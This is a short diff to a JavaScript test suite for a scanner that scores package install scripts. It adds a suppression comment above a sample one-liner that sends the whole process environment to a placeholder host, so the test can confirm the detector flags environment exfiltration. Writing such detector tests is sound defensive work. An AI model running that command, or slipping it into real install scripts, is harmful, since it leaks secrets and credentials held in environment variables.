@@ -42,6 +42,7 @@ describe('install-script scoring', () => {
       'credential-path',
     );
     const exfil = scoreScript(
+      // threatcrush-disable-next-line js-environment-exfiltration -- a sample for the detector under test
       script('node -e "fetch(\'https://x.example\',{body:JSON.stringify(process.env)})"'),
     );
     expect(exfil.signals.map((s) => s.rule)).toContain('env-exfiltration');
